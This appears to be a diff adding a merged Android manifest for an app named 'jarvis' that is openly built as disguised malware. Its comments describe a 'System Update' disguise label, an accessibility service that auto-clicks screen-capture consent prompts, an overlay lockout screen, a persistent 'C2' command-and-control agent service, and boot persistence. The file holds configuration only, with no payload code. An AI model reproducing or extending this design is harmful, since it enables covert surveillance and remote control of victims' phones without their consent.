@@ -1,0 +1,254 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.ai.assistant.jarvis"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="24"
+9        android:targetSdkVersion="34" />
+10
+11    <!-- Network -->
+12    <uses-permission android:name="android.permission.INTERNET" />
+12-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:6:5-67
+12-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:6:22-64
+13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+13-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:7:5-79
+13-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:7:22-76
+14
+15    <!-- Overlay (for "System Update" lock screen) -->
+16    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+16-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:10:5-78
+16-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:10:22-75
+17
+18    <!-- Background service -->
+19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+19-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:13:5-77
+19-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:13:22-74
+20    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+20-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:14:5-94
+20-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:14:22-91
+21    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+21-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:15:5-87
+21-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:15:22-84
+22
+23    <!-- Boot persistence -->
+24    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+24-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:18:5-81
+24-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:18:22-78
+25
+26    <!-- Screen capture -->
+27    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+27-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:21:5-80
+27-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:21:22-77
+28
+29    <!-- Wake lock (keep CPU alive) -->
+30    <uses-permission android:name="android.permission.WAKE_LOCK" />
+30-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:24:5-68
+30-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:24:22-65
+31
+32    <permission
+32-->[androidx.core:core:1.12.0] /Users/shahidhasan/.gradle/caches/transforms-3/440a64c1659b3784956be1ef27019da1/transformed/core-1.12.0/AndroidManifest.xml:22:5-24:47
+33        android:name="com.ai.assistant.jarvis.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
+33-->[androidx.core:core:1.12.0] /Users/shahidhasan/.gradle/caches/transforms-3/440a64c1659b3784956be1ef27019da1/transformed/core-1.12.0/AndroidManifest.xml:23:9-81
+34        android:protectionLevel="signature" />
+34-->[androidx.core:core:1.12.0] /Users/shahidhasan/.gradle/caches/transforms-3/440a64c1659b3784956be1ef27019da1/transformed/core-1.12.0/AndroidManifest.xml:24:9-44
+35
+36    <uses-permission android:name="com.ai.assistant.jarvis.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
+36-->[androidx.core:core:1.12.0] /Users/shahidhasan/.gradle/caches/transforms-3/440a64c1659b3784956be1ef27019da1/transformed/core-1.12.0/AndroidManifest.xml:26:5-97
+36-->[androidx.core:core:1.12.0] /Users/shahidhasan/.gradle/caches/transforms-3/440a64c1659b3784956be1ef27019da1/transformed/core-1.12.0/AndroidManifest.xml:26:22-94
+37
+38    <application
+38-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:26:5-91:19
+39        android:allowBackup="false"
+39-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:27:9-36
+40        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+40-->[androidx.core:core:1.12.0] /Users/shahidhasan/.gradle/caches/transforms-3/440a64c1659b3784956be1ef27019da1/transformed/core-1.12.0/AndroidManifest.xml:28:18-86
+41        android:debuggable="true"
+42        android:extractNativeLibs="false"
+43        android:icon="@mipmap/ic_launcher"
+43-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:28:9-43
+44        android:label="System Update"
+44-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:29:9-38
+45        android:roundIcon="@mipmap/ic_launcher_round"
+45-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:30:9-54
+46        android:supportsRtl="true"
+46-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:31:9-35
+47        android:theme="@style/Theme.Jarvis" >
+47-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:32:9-44
+48
+49        <!-- Main activity (disguised label) -->
+50        <activity
+50-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:35:9-42:20
+51            android:name="com.ai.assistant.jarvis.MainActivity"
+51-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:36:13-41
+52            android:exported="true" >
+52-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:37:13-36
+53            <intent-filter>
+53-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:38:13-41:29
+54                <action android:name="android.intent.action.MAIN" />
+54-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:39:17-69
+54-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:39:25-66
+55
+56                <category android:name="android.intent.category.LAUNCHER" />
+56-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:40:17-77
+56-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:40:27-74
+57            </intent-filter>
+58        </activity>
+59
+60        <!-- Accessibility service for auto-clicking MediaProjection prompts -->
+61        <service
+61-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:45:9-55:19
+62            android:name="com.ai.assistant.jarvis.JarvisAccessibilityService"
+62-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:46:13-55
+63            android:exported="false"
+63-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:48:13-37
+64            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+64-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:47:13-79
+65            <intent-filter>
+65-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:49:13-51:29
+66                <action android:name="android.accessibilityservice.AccessibilityService" />
+66-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:50:17-92
+66-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:50:25-89
+67            </intent-filter>
+68
+69            <meta-data
+69-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:52:13-54:72
+70                android:name="android.accessibilityservice"
+70-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:53:17-60
+71                android:resource="@xml/accessibility_service_config" />
+71-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:54:17-69
+72        </service>
+73
+74        <!-- Overlay lockout service -->
+75        <service
+75-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:58:9-60:40
+76            android:name="com.ai.assistant.jarvis.LockoutService"
+76-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:59:13-43
+77            android:exported="false" />
+77-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:60:13-37
+78
+79        <!-- Persistent C2 foreground service -->
+80        <service
+80-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:63:9-66:56
+81            android:name="com.ai.assistant.jarvis.JarvisAgentService"
+81-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:64:13-47
+82            android:exported="false"
+82-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:65:13-37
+83            android:foregroundServiceType="dataSync" />
+83-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:66:13-53
+84
+85        <!-- Screen state receiver (screen on/off/unlock) -->
+86        <receiver
+86-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:69:9-77:20
+87            android:name="com.ai.assistant.jarvis.ScreenStateReceiver"
+87-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:70:13-48
+88            android:exported="false" >
+88-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:71:13-37
+89            <intent-filter>
+89-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:72:13-76:29
+90                <action android:name="android.intent.action.SCREEN_OFF" />
+90-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:73:17-75
+90-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:73:25-72
+91                <action android:name="android.intent.action.SCREEN_ON" />
+91-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:74:17-74
+91-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:74:25-71
+92                <action android:name="android.intent.action.USER_PRESENT" />
+92-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:75:17-77
+92-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:75:25-74
+93            </intent-filter>
+94        </receiver>
+95
+96        <!-- Boot receiver — restart C2 agent after device reboot -->
+97        <receiver
+97-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:80:9-89:20
+98            android:name="com.ai.assistant.jarvis.BootReceiver"
+98-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:81:13-41
+99            android:enabled="true"
+99-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:83:13-35
+100            android:exported="true" >
+100-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:82:13-36
+101            <intent-filter android:priority="999" >
+101-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:84:13-88:29
+101-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:84:28-50
+102                <action android:name="android.intent.action.BOOT_COMPLETED" />
+102-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:85:17-79
+102-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:85:25-76
+103                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+103-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:86:17-82
+103-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:86:25-79
+104
+105                <category android:name="android.intent.category.DEFAULT" />
+105-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:87:17-76
+105-->/Users/shahidhasan/createHalal/robo-ng2/Jarvis/app/src/main/AndroidManifest.xml:87:27-73
+106            </intent-filter>
+107        </receiver>
+108
+109        <provider
+109-->[androidx.emoji2:emoji2:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/161d2e0566de4dbd90cbc47319c186f1/transformed/emoji2-1.3.0/AndroidManifest.xml:24:9-32:20
+110            android:name="androidx.startup.InitializationProvider"
+110-->[androidx.emoji2:emoji2:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/161d2e0566de4dbd90cbc47319c186f1/transformed/emoji2-1.3.0/AndroidManifest.xml:25:13-67
+111            android:authorities="com.ai.assistant.jarvis.androidx-startup"
+111-->[androidx.emoji2:emoji2:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/161d2e0566de4dbd90cbc47319c186f1/transformed/emoji2-1.3.0/AndroidManifest.xml:26:13-68
+112            android:exported="false" >
+112-->[androidx.emoji2:emoji2:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/161d2e0566de4dbd90cbc47319c186f1/transformed/emoji2-1.3.0/AndroidManifest.xml:27:13-37
+113            <meta-data
+113-->[androidx.emoji2:emoji2:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/161d2e0566de4dbd90cbc47319c186f1/transformed/emoji2-1.3.0/AndroidManifest.xml:29:13-31:52
+114                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+114-->[androidx.emoji2:emoji2:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/161d2e0566de4dbd90cbc47319c186f1/transformed/emoji2-1.3.0/AndroidManifest.xml:30:17-75
+115                android:value="androidx.startup" />
+115-->[androidx.emoji2:emoji2:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/161d2e0566de4dbd90cbc47319c186f1/transformed/emoji2-1.3.0/AndroidManifest.xml:31:17-49
+116            <meta-data
+116-->[androidx.lifecycle:lifecycle-process:2.7.0] /Users/shahidhasan/.gradle/caches/transforms-3/01096349b0936ba7f741e909295c017b/transformed/lifecycle-process-2.7.0/AndroidManifest.xml:29:13-31:52
+117                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+117-->[androidx.lifecycle:lifecycle-process:2.7.0] /Users/shahidhasan/.gradle/caches/transforms-3/01096349b0936ba7f741e909295c017b/transformed/lifecycle-process-2.7.0/AndroidManifest.xml:30:17-78
+118                android:value="androidx.startup" />
+118-->[androidx.lifecycle:lifecycle-process:2.7.0] /Users/shahidhasan/.gradle/caches/transforms-3/01096349b0936ba7f741e909295c017b/transformed/lifecycle-process-2.7.0/AndroidManifest.xml:31:17-49
+119            <meta-data
+119-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:29:13-31:52
+120                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
+120-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:30:17-85
+121                android:value="androidx.startup" />
+121-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:31:17-49
+122        </provider>
+123
+124        <receiver
+124-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:34:9-52:20
+125            android:name="androidx.profileinstaller.ProfileInstallReceiver"
+125-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:35:13-76
+126            android:directBootAware="false"
+126-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:36:13-44
+127            android:enabled="true"
+127-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:37:13-35
+128            android:exported="true"
+128-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:38:13-36
+129            android:permission="android.permission.DUMP" >
+129-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:39:13-57
+130            <intent-filter>
+130-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:40:13-42:29
+131                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
+131-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:41:17-91
+131-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:41:25-88
+132            </intent-filter>
+133            <intent-filter>
+133-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:43:13-45:29
+134                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
+134-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:44:17-85
+134-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:44:25-82
+135            </intent-filter>
+136            <intent-filter>
+136-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:46:13-48:29
+137                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
+137-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:47:17-88
+137-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:47:25-85
+138            </intent-filter>
+139            <intent-filter>
+139-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:49:13-51:29
+140                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
+140-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:50:17-95
+140-->[androidx.profileinstaller:profileinstaller:1.3.0] /Users/shahidhasan/.gradle/caches/transforms-3/4dbbd11a74d28bd64c37893cccf57482/transformed/profileinstaller-1.3.0/AndroidManifest.xml:50:25-92
+141            </intent-filter>
+142        </receiver>
+143    </application>
+144
+145</manifest>
